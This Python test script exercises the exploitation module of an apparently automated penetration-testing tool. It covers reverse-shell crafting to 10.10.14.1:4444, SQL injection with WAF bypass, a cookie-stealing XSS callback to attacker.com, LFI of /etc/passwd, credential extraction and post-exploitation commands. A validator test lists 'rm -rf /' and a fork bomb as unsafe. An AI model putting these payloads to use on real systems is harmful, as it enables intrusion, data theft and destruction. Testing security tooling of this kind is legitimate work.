#!/usr/bin/env python3
"""
Test script for the Exploitation Module

Run from backend directory:
    python -m exploitation.test_exploitation

Or:
    python exploitation/test_exploitation.py
"""

import sys
import os

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import asyncio
import json
from datetime import datetime


def test_exploit_database():
    """Test ExploitDatabase functionality"""
    print("\n" + "="*60)
    print("TEST 1: Exploit Database")
    print("="*60)
    
    from exploitation.exploit_db import get_exploit_database, ExploitCategory
    
    db = get_exploit_database()
    
    # Test stats
    stats = db.get_stats()
    print(f"\nDatabase Stats:")
    print(f"  Total templates: {stats['total_templates']}")
    print(f"  CVEs covered: {stats['cves_covered']}")
    print(f"  Services covered: {stats['services_covered']}")
    print(f"  Tools: {', '.join(stats['tools'][:10])}...")
    
    # Test CVE lookup
    print(f"\nCVE Lookup Test (CVE-2021-44228):")
    log4j_exploits = db.get_by_cve("CVE-2021-44228")
    if log4j_exploits:
        print(f"  Found {len(log4j_exploits)} exploits for Log4Shell")
        for exp in log4j_exploits:
            print(f"    - {exp.name} (reliability: {exp.reliability})")
    else:
        print("  No exploits found (expected if templates not loaded)")
    
    # Test service lookup
    print(f"\nService Lookup Test (wordpress):")
    wp_exploits = db.get_by_service("wordpress")
    print(f"  Found {len(wp_exploits)} WordPress exploits")
    
    # Test category lookup
    print(f"\nCategory Lookup Test (WEB_INJECTION):")
    sqli_exploits = db.get_by_category(ExploitCategory.WEB_INJECTION)
    print(f"  Found {len(sqli_exploits)} web injection exploits")
    
    # Test command building
    print(f"\nCommand Building Test:")
    if sqli_exploits:
        template = sqli_exploits[0]
        context = {
            'target': 'http://testphp.vulnweb.com/artists.php?artist=1',
            'url': 'http://testphp.vulnweb.com/artists.php?artist=1',
        }
        command = template.build_command(context)
        print(f"  Template: {template.name}")
        print(f"  Command: {command[:100]}...")
    
    # Test finding match
    print(f"\nFinding Match Test:")
    finding = {
        'type': 'sql_injection',
        'severity': 'high',
        'url': 'http://target.com/page?id=1'
    }
    context = {'target': 'http://target.com/page?id=1'}
    
    match = db.get_exploit_for_finding(finding, context)
    if match:
        template, command = match
        print(f"  Matched template: {template.name}")
        print(f"  Command: {command[:80]}...")
    else:
        print("  No match found")
    
    print("\n[OK] Exploit Database tests passed")
    return True


def test_payload_crafter():
    """Test PayloadCrafter functionality"""
    print("\n" + "="*60)
    print("TEST 2: Payload Crafter")
    print("="*60)
    
    from exploitation.payload_crafter import (
        get_payload_crafter,
        ShellType,
        SQLDialect,
        EncodingType
    )
    
    crafter = get_payload_crafter()
    
    # Test reverse shells
    print(f"\nReverse Shell Tests:")
    for shell_type in [ShellType.BASH, ShellType.PYTHON3, ShellType.PHP, ShellType.NC_MKFIFO]:
        try:
            payload = crafter.craft_reverse_shell(
                shell_type=shell_type,
                lhost="10.10.14.1",
                lport=4444
            )
            print(f"  {shell_type.value}: {payload.payload[:60]}...")
        except Exception as e:
            print(f"  {shell_type.value}: ERROR - {e}")
    
    # Test encoded shell
    print(f"\nEncoded Shell Test (Base64):")
    encoded_payload = crafter.craft_reverse_shell(
        shell_type=ShellType.BASH,
        lhost="10.10.14.1",
        lport=4444,
        encoding=EncodingType.BASE64
    )
    print(f"  Encoded: {encoded_payload.payload[:80]}...")
    
    # Test SQL injection payloads
    print(f"\nSQL Injection Tests:")
    for inj_type in ["union_basic", "blind_boolean", "blind_sleep", "auth_bypass_or"]:
        try:
            payload = crafter.craft_sqli(
                injection_type=inj_type,
                columns=5
            )
            print(f"  {inj_type}: {payload.payload[:50]}...")
        except Exception as e:
            print(f"  {inj_type}: ERROR - {e}")
    
    # Test SQLi with WAF bypass
    print(f"\nSQLi with WAF Bypass:")
    waf_payload = crafter.craft_sqli(
        injection_type="union_basic",
        columns=5,
        waf_bypass=True
    )
    print(f"  Original: ' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -")
    print(f"  Bypassed: {waf_payload.payload}")
    
    # Test XSS payloads
    print(f"\nXSS Tests:")
    for xss_type in ["basic_script", "basic_img", "steal_cookie_fetch"]:
        try:
            payload = crafter.craft_xss(
                xss_type=xss_type,
                marker="XSS_TEST",
                callback="http://attacker.com/steal"
            )
            print(f"  {xss_type}: {payload.payload[:60]}...")
        except Exception as e:
            print(f"  {xss_type}: ERROR - {e}")
    
    # Test XSS polyglots
    print(f"\nXSS Polyglots:")
    polyglots = crafter.get_xss_polyglots()
    print(f"  Generated {len(polyglots)} polyglot payloads")
    
    # Test command injection
    print(f"\nCommand Injection Tests:")
    for cmdi_type in ["basic_semicolon", "basic_pipe", "blind_sleep"]:
        try:
            payload = crafter.craft_cmdi(
                cmdi_type=cmdi_type,
                command="id",
                delay=5
            )
            print(f"  {cmdi_type}: {payload.payload}")
        except Exception as e:
            print(f"  {cmdi_type}: ERROR - {e}")
    
    # Test LFI payloads
    print(f"\nLFI Tests:")
    for lfi_type in ["basic_passwd", "php_filter_base64", "log_apache_access"]:
        try:
            payload = crafter.craft_lfi(
                lfi_type=lfi_type,
                file="/etc/passwd"
            )
            print(f"  {lfi_type}: {payload.payload[:60]}...")
        except Exception as e:
            print(f"  {lfi_type}: ERROR - {e}")
    
    # Test all reverse shells
    print(f"\nAll Reverse Shell Variants:")
    all_shells = crafter.get_all_reverse_shells("10.10.14.1", 4444)
    print(f"  Generated {len(all_shells)} shell variants")
    
    # Test auth bypass payloads
    print(f"\nAuth Bypass Payloads:")
    auth_bypass = crafter.craft_sqli_auth_bypass(waf_bypass=False)
    print(f"  Generated {len(auth_bypass)} auth bypass payloads")
    
    print("\n[OK] Payload Crafter tests passed")
    return True


def test_exploit_executor():
    """Test ExploitExecutor functionality"""
    print("\n" + "="*60)
    print("TEST 3: Exploit Executor")
    print("="*60)
    
    from exploitation.exploit_executor import get_exploit_executor, ExploitStatus
    
    executor = get_exploit_executor()
    
    # Test command validation
    print(f"\nCommand Validation Tests:")
    test_commands = [
        ("echo 'safe command'", True),
        ("rm -rf /", False),
        ("sqlmap -u 'http://test.com' --batch", True),
        (":(){ :|:& };:", False),
    ]
    
    for cmd, expected_safe in test_commands:
        is_safe, reason = executor._validate_command(cmd)
        status = "[OK]" if is_safe == expected_safe else "[FAIL]"
        print(f"  {status} '{cmd[:40]}...' -> safe={is_safe}")
    
    # Test output analysis
    print(f"\nOutput Analysis Tests:")
    
    # Simulated successful SQLi output
    sqli_output = """
    [INFO] testing connection to the target URL
    [INFO] testing if the target URL content is stable
    [INFO] target URL content is stable
    [INFO] testing if GET parameter 'id' is dynamic
    [INFO] confirming that GET parameter 'id' is dynamic
    [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
    available databases [5]:
    [*] information_schema
    [*] mysql
    [*] performance_schema
    [*] sys
    [*] webapp_db
    """
    
    result = executor._analyze_output(
        output=sqli_output,
        exploit_id="sqli_test",
        command="sqlmap ...",
        execution_time=45.2,
        success_indicators=["available databases", "information_schema"],
        failure_indicators=["not injectable"]
    )
    
    print(f"  SQLi output analysis:")
    print(f"    Status: {result.status.value}")
    print(f"    Success indicators found: {result.success_indicators_found}")
    print(f"    Databases extracted: {result.extracted_data.get('databases', [])}")
    
    # Simulated WAF blocked output
    waf_output = """
    [WARNING] HTTP error codes detected during run:
    403 (Forbidden) - Access Denied
    The target appears to have a web application firewall
    Request blocked by mod_security
    """
    
    result = executor._analyze_output(
        output=waf_output,
        exploit_id="waf_test",
        command="sqlmap ...",
        execution_time=5.0,
        success_indicators=["available databases"],
        failure_indicators=["blocked", "forbidden"]
    )
    
    print(f"\n  WAF blocked output analysis:")
    print(f"    Status: {result.status.value}")
    print(f"    Recommendations: {result.recommendations[:2]}")
    
    # Simulated shell output
    shell_output = """
    [*] Command shell session 1 opened
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    www-data@target:/var/www/html$
    """
    
    result = executor._analyze_output(
        output=shell_output,
        exploit_id="shell_test",
        command="exploit ...",
        execution_time=12.0,
        success_indicators=["shell", "uid="],
        failure_indicators=[]
    )
    
    print(f"\n  Shell output analysis:")
    print(f"    Status: {result.status.value}")
    print(f"    Shell obtained: {result.shell_obtained}")
    print(f"    Recommendations: {result.recommendations[:2]}")
    
    # Test credential extraction
    print(f"\nCredential Extraction Tests:")
    cred_outputs = [
        "admin:password123",
        "user@example.com:secretpass",
        "root:$6$rounds=5000$saltsalt$hashhashhash",
        "administrator:5f4dcc3b5aa765d61d8327deb882cf99",
    ]
    
    for output in cred_outputs:
        creds = executor._extract_credentials(output)
        if creds:
            print(f"  '{output[:30]}...' -> {creds[0]['type']}: {creds[0]['username']}")
        else:
            print(f"  '{output[:30]}...' -> No credentials found")
    
    # Test stats
    print(f"\nExecutor Stats:")
    stats = executor.get_execution_stats()
    print(f"  Total executions: {stats['total']}")
    
    print("\n[OK] Exploit Executor tests passed")
    return True


def test_integration():
    """Test integration module"""
    print("\n" + "="*60)
    print("TEST 4: Integration Module")
    print("="*60)
    
    from exploitation.integration import (
        ExploitationManager,
        enrich_tool_command_with_exploit,
        get_post_exploitation_commands
    )
    
    # Test ExploitationManager (without tool_manager)
    manager = ExploitationManager(tool_manager=None)
    
    print(f"\nExploitationManager Stats:")
    stats = manager.get_stats()
    print(f"  Templates available: {stats['templates_available']}")
    print(f"  Executor stats: {stats['executor_stats']}")
    
    # Test CVE lookup
    print(f"\nCVE Exploit Lookup:")
    context = {'target': 'http://vulnerable.com'}
    result = manager.get_exploit_for_cve("CVE-2021-44228", context)
    if result:
        template, command = result
        print(f"  Template: {template.name}")
        print(f"  Command: {command[:60]}...")
    
    # Test reverse shell craft
    print(f"\nReverse Shell Craft:")
    shell = manager.craft_reverse_shell("10.10.14.1", 4444, "bash")
    print(f"  Bash shell: {shell[:60]}...")
    
    # Test SQLi payload craft
    print(f"\nSQLi Payload Craft:")
    sqli = manager.craft_sqli_payload("union_basic", columns=5)
    print(f"  Union payload: {sqli}")
    
    # Test XSS payload craft
    print(f"\nXSS Payload Craft:")
    xss = manager.craft_xss_payload("basic_script")
    print(f"  XSS payload: {xss}")
    
    # Test tool command enrichment
    print(f"\nTool Command Enrichment:")
    enhanced = enrich_tool_command_with_exploit(
        tool_name="sqlmap",
        target="http://target.com/page?id=1"
    )
    if enhanced:
        print(f"  Enhanced command: {enhanced[:60]}...")
    
    # Test post-exploitation commands
    print(f"\nPost-Exploitation Commands:")
    linux_cmds = get_post_exploitation_commands("linux", "enumerate")
    print(f"  Linux enumerate ({len(linux_cmds)} commands):")
    for cmd in linux_cmds[:5]:
        print(f"    - {cmd}")
    
    windows_cmds = get_post_exploitation_commands("windows", "privesc")
    print(f"  Windows privesc ({len(windows_cmds)} commands):")
    for cmd in windows_cmds[:3]:
        print(f"    - {cmd}")
    
    print("\n[OK] Integration tests passed")
    return True


async def test_async_execution():
    """Test async exploit execution"""
    print("\n" + "="*60)
    print("TEST 5: Async Execution (Mock)")
    print("="*60)
    
    from exploitation.integration import ExploitationManager
    
    manager = ExploitationManager(tool_manager=None)
    
    # Mock finding
    finding = {
        'type': 'sql_injection',
        'severity': 'high',
        'url': 'http://testphp.vulnweb.com/artists.php?artist=1',
        'parameter': 'artist',
    }
    
    context = {
        'target': 'http://testphp.vulnweb.com/artists.php?artist=1',
        'lhost': '10.10.14.1',
        'lport': 4444,
    }
    
    print(f"\nAttempting to exploit finding (mock):")
    print(f"  Type: {finding['type']}")
    print(f"  Target: {context['target']}")
    
    # Note: This will fail without a real tool_manager, but tests the flow
    try:
        result = await manager.exploit_finding(finding, context, max_attempts=1)
        print(f"  Result status: {result.get('status', 'unknown')}")
    except Exception as e:
        print(f"  Expected error (no tool_manager): {type(e).__name__}")
    
    print("\n[OK] Async execution test passed (flow verified)")
    return True


def run_all_tests():
    """Run all tests"""
    print("\n" + "="*60)
    print("OPTIMUS EXPLOITATION MODULE TESTS")
    print("="*60)
    print(f"Started: {datetime.now().isoformat()}")
    
    results = []
    
    # Run sync tests
    results.append(("Exploit Database", test_exploit_database()))
    results.append(("Payload Crafter", test_payload_crafter()))
    results.append(("Exploit Executor", test_exploit_executor()))
    results.append(("Integration", test_integration()))
    
    # Run async test
    results.append(("Async Execution", asyncio.run(test_async_execution())))
    
    # Summary
    print("\n" + "="*60)
    print("TEST SUMMARY")
    print("="*60)
    
    passed = sum(1 for _, r in results if r)
    failed = len(results) - passed
    
    for name, result in results:
        status = "[PASS]" if result else "[FAIL]"
        print(f"  {status} {name}")
    
    print(f"\nTotal: {passed} passed, {failed} failed")
    print(f"Finished: {datetime.now().isoformat()}")
    
    return failed == 0


if __name__ == "__main__":
    success = run_all_tests()
    sys.exit(0 if success else 1)
